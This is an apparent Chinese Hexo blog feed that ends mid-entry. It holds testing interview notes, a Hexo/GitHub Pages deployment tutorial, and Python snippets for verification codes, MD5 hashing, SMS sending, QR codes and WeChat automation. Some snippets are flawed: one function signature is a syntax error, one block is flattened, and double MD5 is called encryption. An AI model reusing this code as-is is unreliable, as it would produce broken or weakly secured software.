title="白盒测试方法："></a>白盒测试方法：</h4><ul><li><p>静态测试：不用运行程序的测试，包括代码检查、静态结构分析、代码质量度量、文档测试等等，它可以由人工进行，充分发挥人的逻辑思维优势，也可以借助软件工具（Fxcop）自动进行。</p></li><li><p>动态测试：需要执行代码，通过运行程序找到问题，包括功能确认与接口测试、覆盖率分析、性能分析、内存分析等。</p></li></ul><h3 id="7-手动测试与自动化测试的缺点"><a href="#7-手动测试与自动化测试的缺点" class="headerlink" title="7 - 手动测试与自动化测试的缺点"></a>7 - 手动测试与自动化测试的缺点</h3><h4 id="手工测试的缺点"><a href="#手工测试的缺点" class="headerlink" title="手工测试的缺点:"></a>手工测试的缺点:</h4><ul><li>重复的手工回归测试，代价昂贵、容易出错。</li><li>依赖于软件测试人员的能力。</li></ul><h4 id="手工测试的优点"><a href="#手工测试的优点" class="headerlink" title="手工测试的优点:"></a>手工测试的优点:</h4><ul><li>测试人员具有经验和对错误的猜测能力。</li><li>测试人员具有审美能力和心理体验。</li><li>测试人员具有是非判断和逻辑推理能力。</li></ul><h4 id="自动化测试的缺点："><a href="#自动化测试的缺点：" class="headerlink" title="自动化测试的缺点："></a>自动化测试的缺点：</h4><ul><li>不能取代手工测试，工具本身并无想像力</li><li>手工测试比自动测试发现的缺陷更多</li><li>对测试质量的依赖性极大</li></ul><h4 id="自动化测试的优点："><a href="#自动化测试的优点：" class="headerlink" title="自动化测试的优点："></a>自动化测试的优点：</h4><ul><li>对程序的回归测试更方便，特别是在程序修改比较频繁时，效果是非常明显的。</li><li>可以运行更多更繁琐的测试，可以执行一些手工测试困难或不可能进行的测试。比如，对于大量用户的测试，不可能同时让足够多的测试人员同时进行测试，但是却可以通过自动化测试模拟同时有许多用户，从而达到测试的目的。</li><li>更好地利用资源。将繁琐的任务自动化，可以提高准确性和测试人员的积极性，将测试技术人员解脱出来投入更多精力设计更好的测试用例</li><li>测试具有一致性和可重复性。由于测试是自动执行的，每次测试的结果和执行的内容的一致性是可以得到保障的，从而达到测试的可重复的效果。</li><li>增加软件信任度。由于测试是自动执行的，所以不存在执行过程中的疏忽和错误，完全取决于测试的设计质量。一旦软件通过了强有力的自动测试后，软件的信任度自然会增加。</li></ul><h3 id="8-自动化的测试有什么意义？需要做什么？"><a href="#8-自动化的测试有什么意义？需要做什么？" class="headerlink" title="8 - 自动化的测试有什么意义？需要做什么？"></a>8 - 自动化的测试有什么意义？需要做什么？</h3><p>自动化测试的意义在于：</p><ul><li>可以对程序的新版本自动执行回归测试</li><li>可以执行手工测试困难或者不可能实现的测试，如压力测试，并发测试等</li><li>能够更好的利用资源，节省时间和人力</li></ul><p>执行自动化测试之前首先判断这个项目适不适合推广自动化测试，然后对项目做需求分析，指定测试计划，搭建自动化测试框架，设计测试用例，执行测试，评估结果。</p><div>  点击下载博客:  <div style="display: flex;    justify-content: center;">         <a href="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/md/%E9%9D%A2%E7%BB%8F%E6%95%B4%E7%90%86.md">      <i class="fa fa-download fa-2x" aria-hidden="true"></i>  </a>  </div></div>]]></content>
      
      
      
        <tags>
            
            <tag> 面经 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>个人博客搭建及部署</title>
      <link href="/2022/08/25/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E5%8F%8A%E9%83%A8%E7%BD%B2/"/>
      <url>/2022/08/25/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E5%8F%8A%E9%83%A8%E7%BD%B2/</url>
      
        <content type="html"><![CDATA[<p>话不多说直接开干</p><p>本次使用的博客框架是 <strong>hexo</strong> ,主题是<strong>butterfly</strong></p><p>需要用到的工具</p><ul><li>Node</li><li>git</li><li>hexo</li><li>github</li></ul><hr><h2 id="安装node"><a href="#安装node" class="headerlink" title="安装node"></a>安装node</h2><p>官网地址: <a href="https://nodejs.org/en/download/">https://nodejs.org/en/download/</a></p><p>选择自己的系统安装即可</p><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-20220825111853781.png" alt="image-20220825111853781"></p><p>修改npm源. npm下载各种模块，默认是从国外服务器下载，速度较慢，建议配置成淘宝镜像。打开终端，运行如下命令:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config set registry https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure><hr><h2 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure><p>验证是否安装成功</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo -v</span><br></pre></td></tr></table></figure><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-20220825112640610.png" alt="image-20220825112640610"></p><hr><h2 id="初始化hexo"><a href="#初始化hexo" class="headerlink" title="初始化hexo"></a>初始化hexo</h2><p>在你想要创建博客的位置打开终端</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo init blogdemo(项目名称)</span><br></pre></td></tr></table></figure><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-20220825113422732.png" alt="image-20220825113422732"></p><hr><h2 id="本地运行"><a href="#本地运行" class="headerlink" title="本地运行"></a>本地运行</h2><p>cd 进入博客根目录</p><p>运行<strong>hexo s</strong>启动博客在本地运行</p><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-20220825113709408.png" alt="image-20220825113709408"></p><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-20220825113757442.png" alt="image-20220825113757442"></p><p>这样博客就在本地启动成功了,之后写博客时可以现在本地看一下运行效果再发布;</p><hr><h2 id="github创建仓库"><a href="#github创建仓库" class="headerlink" title="github创建仓库"></a>github创建仓库</h2><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-20220825114021362.png" alt="image-20220825114021362"></p><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-20220825114623963.png" alt="image-20220825114623963"></p><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-20220825114806471.png" alt="image-20220825114806471"></p><hr><h2 id="配置hexo"><a href="#配置hexo" class="headerlink" title="配置hexo"></a>配置hexo</h2><p>打开博客根目录中的**_config.yml**文件到最下面修改如下:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加 git</span></span><br><span class="line">  type: git</span><br><span class="line"><span class="meta prompt_">  # </span><span class="language-bash">添加下面两行,链接是你刚刚复制的链接</span></span><br><span class="line">  repo: https://github.com/kaliluying/kaliluying.github.io.git</span><br><span class="line"><span class="meta prompt_">  # </span><span class="language-bash">分支,之前是master现在GitHub改成了main</span></span><br><span class="line">  branch: main</span><br></pre></td></tr></table></figure><h2 id="将博客挂载到-GitHub-Pages"><a href="#将博客挂载到-GitHub-Pages" class="headerlink" title="将博客挂载到 GitHub Pages"></a>将博客挂载到 GitHub Pages</h2><h5 id="安装-hexo-deployer-git"><a href="#安装-hexo-deployer-git" class="headerlink" title="安装 hexo-deployer-git"></a>安装 hexo-deployer-git</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><h5 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo generate</span><br><span class="line">hexo deploy</span><br></pre></td></tr></table></figure><ul><li>hexo clean：删除之前生成的文件，若未生成过静态文件，可忽略此命令。</li><li>hexo generate：生成静态文件，可以用hexo g缩写</li><li>hexo deploy：部署文章，可以用hexo d缩写</li></ul><blockquote><p>第一次可能会让输入用户名密码,跟随提示就好了</p></blockquote><p>访问你设置的仓库名: <a href="https://kaliluying.github.io/">https://kaliluying.github.io/</a> 就可以成功访问了</p><hr><h2 id="修改hexo主题"><a href="#修改hexo主题" class="headerlink" title="修改hexo主题"></a>修改hexo主题</h2><p>默认的主题太丑了,可以换一个主题,这里我用的是<strong>butterfly</strong></p><p>官网 : <a href="https://butterfly.js.org/">https://butterfly.js.org/</a></p><p>演示地址: <a href="https://tzy1997.com/">https://tzy1997.com/</a></p><h5 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h5><p>在博客根目录下运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone -b master https://github.com/jerryc127/hexo-theme-butterfly.git themes/butterfly</span><br></pre></td></tr></table></figure><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-20220825121222974.png" alt="image-20220825121222974"></p><p>在themes 目录下就有了一个butterfly的目录</p><p>打开博客根目录中的**_config.yml**文件到最下面修改如下:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Extensions</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># Plugins: https://hexo.io/plugins/</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># Themes: https://hexo.io/themes/</span></span></span><br><span class="line">theme: butterfly    # 原来是landscape更换成butterfly</span><br></pre></td></tr></table></figure><p>安装pug以及stylus的渲染器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-renderer-pug hexo-renderer-stylus --save</span><br></pre></td></tr></table></figure><p>再次运行,就可以在本地看效果</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-20220825124220964.png" alt="image-20220825124220964"></p><p>想要进一步DIY可以参考这篇博客</p><p>教程:  <a href="https://tzy1997.com/articles/hexo1600/">https://tzy1997.com/articles/hexo1600/</a></p><div>  点击下载博客:  <div style="display: flex;    justify-content: center;">      <a href="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/md/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E5%8F%8A%E9%83%A8%E7%BD%B2.md">    <i class="fa fa-download fa-2x" aria-hidden="true"></i>    </a>  </div></div>]]></content>
      
      
      
        <tags>
            
            <tag> 博客搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python组件库分享</title>
      <link href="/2022/08/24/python%E7%BB%84%E4%BB%B6%E5%BA%93%E5%88%86%E4%BA%AB/"/>
      <url>/2022/08/24/python%E7%BB%84%E4%BB%B6%E5%BA%93%E5%88%86%E4%BA%AB/</url>
      
        <content type="html"><![CDATA[<h2 id="1-生成6位数字随机验证码并存入redis中"><a href="#1-生成6位数字随机验证码并存入redis中" class="headerlink" title="1. 生成6位数字随机验证码并存入redis中"></a>1. 生成6位数字随机验证码并存入redis中</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> django_redis <span class="keyword">import</span> get_redis_connection</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">num_code</span>(<span class="params">length=<span class="number">6</span>, mobile_phone</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    生成长度为length的数字随机验证码</span></span><br><span class="line"><span class="string">    :param length: 验证码长度</span></span><br><span class="line"><span class="string">    :param mobile_phone 手机号</span></span><br><span class="line"><span class="string">    :return: 验证码</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    code = <span class="string">&#x27;&#x27;</span>.join(random.choice(string.digits) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, length))</span><br><span class="line">    </span><br><span class="line">    conn = get_redis_connection()<span class="comment"># 可以添加指定数据库</span></span><br><span class="line">    conn.<span class="built_in">set</span>(mobile_phone, code, ex=<span class="number">60</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> code</span><br></pre></td></tr></table></figure><h2 id="2-md5加密"><a href="#2-md5加密" class="headerlink" title="2.md5加密"></a>2.md5加密</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>  hashlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># md5加密</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5_encrypt</span>(<span class="params">en_str</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    使用md5二次加密生成32位的字符串</span></span><br><span class="line"><span class="string">    :param en_str: 需要加密的字符串</span></span><br><span class="line"><span class="string">    :return: 加密后的字符串</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">   </span><br><span class="line">    md5 = hashlib.md5()  <span class="comment"># 使用MD5加密模式</span></span><br><span class="line">    md5.update(en_str.encode(<span class="string">&#x27;utf-8&#x27;</span>))  <span class="comment"># 将参数字符串传入</span></span><br><span class="line">    md5.update(md5.hexdigest().encode(<span class="string">&#x27;utf-8&#x27;</span>))  <span class="comment"># md5二次加密</span></span><br><span class="line">    <span class="keyword">return</span> md5.hexdigest()</span><br></pre></td></tr></table></figure><h2 id="3-生成唯一token"><a href="#3-生成唯一token" class="headerlink" title="3. 生成唯一token"></a>3. 生成唯一token</h2><pre><code>import uuidimport  hashlibdef only_token():    &quot;&quot;&quot;    使用md5加密uuid生成唯一的32位token    :return: 加密后的字符串    &quot;&quot;&quot;md5 = hashlib.md5()  # 使用MD5加密模式md5.update(str(uuid.uuid1()).encode(&#39;utf-8&#39;))  return md5.hexdigest()</code></pre><h2 id="4、发送手机验证码"><a href="#4、发送手机验证码" class="headerlink" title="4、发送手机验证码"></a>4、发送手机验证码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#验证码管理表</span><br><span class="line">class AuthCode(models.Model):</span><br><span class="line">    name = models.CharField(max_length=10,default=None, null=True, blank=True,verbose_name=&#x27;姓名&#x27;)</span><br><span class="line">    phone = models.CharField(max_length=11, unique=True, verbose_name=&#x27;手机号&#x27;)</span><br><span class="line">    code = models.CharField(max_length=6,verbose_name=&#x27;验证码&#x27;)</span><br><span class="line">    purpose = models.IntegerField(default=0,verbose_name=&#x27;用途:0-&gt;注册验证 1-&gt;找回密码 2-&gt;其它&#x27;)</span><br><span class="line">    sendNum = models.IntegerField(default=0,verbose_name=&#x27;发送次数&#x27;)</span><br><span class="line">    isCanGet = models.BooleanField(default=0,verbose_name=&#x27;0-&gt;可以获取,1-&gt;不可以获取&#x27;)</span><br><span class="line">    recentlySendTime = models.DateTimeField(auto_now_add=True,verbose_name=&#x27;最近一次发送时间&#x27;)</span><br><span class="line">    creation_time = models.DateTimeField(auto_now=True, verbose_name=&#x27;创建时间&#x27;)</span><br><span class="line"></span><br><span class="line">    class Meta:</span><br><span class="line">        verbose_name = &#x27;手机验证码&#x27;</span><br><span class="line">        verbose_name_plural = verbose_name</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="实现逻辑"><a href="#实现逻辑" class="headerlink" title="实现逻辑"></a>实现逻辑</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import http.client</span><br><span class="line">import urllib</span><br><span class="line"># 使用互亿无线</span><br><span class="line">host = &quot;106.ihuyi.com&quot;</span><br><span class="line">sms_send_uri = &quot;/webservice/sms.php?method=Submit&quot;</span><br><span class="line"></span><br><span class="line"># 查看用户名 登录用户中心-&gt;验证码通知短信&gt;产品总览-&gt;API接口信息-&gt;APIID</span><br><span class="line">account = &quot;你的用户名&quot;</span><br><span class="line"># 查看密码 登录用户中心-&gt;验证码通知短信&gt;产品总览-&gt;API接口信息-&gt;APIKEY</span><br><span class="line">password = &quot;你的密码&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def send_sms(text, mobile):</span><br><span class="line">    text = f&quot;您的验证码是：&#123;text&#125;。请不要把验证码泄露给其他人。&quot;</span><br><span class="line">    params = urllib.parse.urlencode(</span><br><span class="line">        &#123;&#x27;account&#x27;: account, &#x27;password&#x27;: password, &#x27;content&#x27;: text, &#x27;mobile&#x27;: mobile, &#x27;format&#x27;: &#x27;json&#x27;&#125;)</span><br><span class="line">    headers = &#123;&quot;Content-type&quot;: &quot;application/x-www-form-urlencoded&quot;, &quot;Accept&quot;: &quot;text/plain&quot;&#125;</span><br><span class="line">    conn = http.client.HTTPConnection(host, port=80, timeout=30)</span><br><span class="line">    conn.request(&quot;POST&quot;, sms_send_uri, params, headers)</span><br><span class="line">    response = conn.getresponse()</span><br><span class="line">    response_str = response.read()</span><br><span class="line">    conn.close()</span><br><span class="line">    return response_str</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    mobile = &quot;手机号&quot;</span><br><span class="line">    text = &#x27;123122&#x27;</span><br><span class="line"></span><br><span class="line">    print(json.loads(send_sms(text, mobile).decode(&#x27;utf-8&#x27;)))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="5、生成二维码"><a href="#5、生成二维码" class="headerlink" title="5、生成二维码"></a>5、生成二维码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">import qrcode</span><br><span class="line">import io</span><br><span class="line"></span><br><span class="line">def maker_qrcode(url):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    生成二维码</span><br><span class="line">    :param url: 需要生成二维码的url</span><br><span class="line">    :return: 返回图片字节流</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    image = qrcode.make(url)  # 创建二维码片</span><br><span class="line"></span><br><span class="line">    buffer = io.BytesIO()</span><br><span class="line">    # 将图片内容丢入容器</span><br><span class="line">    image.save(buffer, &#x27;png&#x27;)</span><br><span class="line">    # 返回容器内的字节</span><br><span class="line">    return buffer.getvalue()</span><br><span class="line">    </span><br><span class="line">或者</span><br><span class="line">from .settings import BASE_DIR</span><br><span class="line"></span><br><span class="line">def create_qrcode(name, url):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    生成机器扫码支付二维码</span><br><span class="line">    :param name: 图片名称</span><br><span class="line">    :param url: 支付路由</span><br><span class="line">    :return:</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    img = qrcode.make(url, border=0)  # 创建二维码片</span><br><span class="line">    save_path = BASE_DIR + &#x27;/&#x27; + name + &#x27;.png&#x27;</span><br><span class="line">    print(save_path)</span><br><span class="line">    img.save(save_path)</span><br><span class="line">    return img</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="6-微信群发"><a href="#6-微信群发" class="headerlink" title="6.微信群发"></a>6.微信群发</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"># coding=utf8</span><br><span class="line">import itchat, time</span><br><span class="line"></span><br><span class="line">itchat.auto_login(True)</span><br><span class="line"></span><br><span class="line">SINCERE_WISH = u&#x27;祝%s新年快乐！&#x27;</span><br><span class="line"></span><br><span class="line">friendList = itchat.get_friends(update=True)[35:]</span><br><span class="line">count = 0</span><br><span class="line"></span><br><span class="line">for  index,friend in enumerate(friendList):</span><br><span class="line">    print(index,friend[&#x27;DisplayName&#x27;],friend[&#x27;NickName&#x27;])</span><br><span class="line">    itchat.send(SINCERE_WISH % (friend[&#x27;DisplayName&#x27;]</span><br><span class="line">                                or friend[&#x27;NickName&#x27;]), friend[&#x27;UserName&#x27;])</span><br><span class="line">    time.sleep(2)</span><br><span class="line">    print(&#x27;备注名称&#x27;,friend[&#x27;DisplayName&#x27;],&#x27;昵称&#x27;,friend[&#x27;NickName&#x27;],&#x27;用户名&#x27;,friend[&#x27;UserName&#x27;])</span><br><span class="line"></span><br><span class="line">print(&quot;----end----&quot;)</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"># 发送文本</span><br><span class="line">itchat.send(&#x27;Hello, WeChat!&#x27;)</span><br><span class="line"># 发送图片</span><br><span class="line">itchat.send_image(&#x27;my_picture.png&#x27;)</span><br><span class="line"># 发送视频</span><br><span class="line">itchat.send_video(&#x27;my_video.mov&#x27;)</span><br><span class="line"># 发送文件</span><br><span class="line">itchat.send_file(&#x27;my_file.zip&#x27;)</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br></pre></td></tr></table></figure><h2 id="7、微信自动回复"><a href="#7、微信自动回复" class="headerlink" title="7、微信自动回复"></a>7、微信自动回复</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding=utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line">import itchat</span><br><span class="line">import random</span><br><span class="line">#图灵机器人</span><br><span class="line">#http://www.tuling123.com/member/robot/1380138/center/frame.jhtml?page=0&amp;child=0获取apikey</span><br><span class="line">KEY = &#x27;你的KEY&#x27;</span><br><span class="line"></span><br><span class="line">def get_response(msg):</span><br><span class="line">    apiUrl = &#x27;http://www.tuling123.com/openapi/api&#x27;</span><br><span class="line">    data = &#123;</span><br><span class="line">        &#x27;key&#x27;    : KEY,</span><br><span class="line">        &#x27;info&#x27;   : msg,</span><br><span class="line">        &#x27;userid&#x27; : &#x27;wechat-robot&#x27;,</span><br><span class="line">    &#125;</span><br><span class="line">    try:</span><br><span class="line">        r = requests.post(apiUrl, data=data).json()</span><br><span class="line">        return r.get(&#x27;text&#x27;)</span><br><span class="line">    except:</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">@itchat.msg_register(itchat.content.TEXT)</span><br><span class="line">def tuling_reply(msg):</span><br><span class="line">    defaultReply = &#x27;I received: &#x27; + msg[&#x27;Text&#x27;]</span><br><span class="line">    robots=[&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;]</span><br><span class="line">    reply = get_response(msg[&#x27;Text&#x27;])+random.choice(robots)</span><br><span class="line">    return reply or defaultReply</span><br><span class="line"></span><br><span class="line">itchat.auto_login(enableCmdQR=False)</span><br><span class="line">itchat.run()</span><br></pre></td></tr></table></figure><h2 id="8、提取Django中model中的字段名变成字典、列表"><a href="#8、提取Django中model中的字段名变成字典、列表" class="headerlink" title="8、提取Django中model中的字段名变成字典、列表"></a>8、提取Django中model中的字段名变成字典、列表</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">t = &quot;&quot;&quot;</span><br><span class="line">    goods_id = models.IntegerField(verbose_name=&#x27;商品编号&#x27;)</span><br><span class="line">    label_code = models.CharField(max_length=20, verbose_name=&#x27;商品标签&#x27;)</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"># 字典</span><br><span class="line">print(&#123;k:None for k in re.findall(&#x27;([a-z_A-Z]+)\s=\s&#x27;,t)&#125;)</span><br><span class="line"># 列表</span><br><span class="line"># print([k for k in re.findall(&#x27;([a-z_A-Z]+)\s=\s&#x27;,t)])</span><br><span class="line"></span><br><span class="line">输出</span><br><span class="line">&#123;&#x27;goods_id&#x27;: None, &#x27;lable_code&#x27;: None&#125;</span><br></pre></td></tr></table></figure><h2 id="9、数据库中给表创建数据"><a href="#9、数据库中给表创建数据" class="headerlink" title="9、数据库中给表创建数据"></a>9、数据库中给表创建数据</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import pymysql</span><br><span class="line"></span><br><span class="line">def createData(dataDict,tableName):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    给数据表创建数据</span><br><span class="line">    :param dataDict: 字典</span><br><span class="line">    :param tableName: 表名</span><br><span class="line">    :return: </span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    